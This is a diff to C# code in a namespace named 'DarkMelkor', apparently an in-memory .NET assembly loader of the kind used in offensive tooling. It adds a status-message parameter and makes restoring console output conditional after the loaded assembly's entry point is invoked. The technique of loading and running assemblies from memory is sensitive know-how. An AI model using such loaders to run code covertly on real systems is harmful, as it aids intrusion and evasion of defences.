@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Reflection;
 using System.Runtime.CompilerServices;
@@ -96,13 +96,13 @@ namespace DarkMelkor
         public static int CRYPTPROTECT_LOCAL_MACHINE = 0x4;
         public static Object CryptLock = new Object();
 
-        public static AppDomain loadAppDomainModule(String sMethod, String sAppDomain, Byte[] bMod)
+        public static AppDomain loadAppDomainModule(String sMethod, String sAppDomain, Byte[] bMod, string run)
         {
             var bytes = bMod;
             string pathToDll = Assembly.GetExecutingAssembly().CodeBase;
             AppDomainSetup domainSetup = new AppDomainSetup { PrivateBinPath = pathToDll };
             AppDomain isolationDomain = AppDomain.CreateDomain(Guid.NewGuid().ToString());
-            isolationDomain.SetData("str", "[!] Before Loader");
+            isolationDomain.SetData("str", "[!] "+run+" run");
             Console.WriteLine(isolationDomain.GetData("str"));
             bool default_domain = AppDomain.CurrentDomain.IsDefaultAppDomain();
             try
@@ -174,10 +174,13 @@ namespace DarkMelkor
                     Console.SetError(stdErrWriter);
                     var result = asm.EntryPoint.Invoke(null, new object[] { args });
 
-                    Console.Out.Flush();
-                    Console.Error.Flush();
-                    Console.SetOut(realStdOut);
-                    Console.SetError(realStdErr);
+                    if (str == "second")
+                    {
+                        Console.Out.Flush();
+                        Console.Error.Flush();
+                        Console.SetOut(realStdOut);
+                        Console.SetError(realStdErr);
+                    }
 
                     output = stdOutWriter.ToString();
                     output += stdErrWriter.ToString();
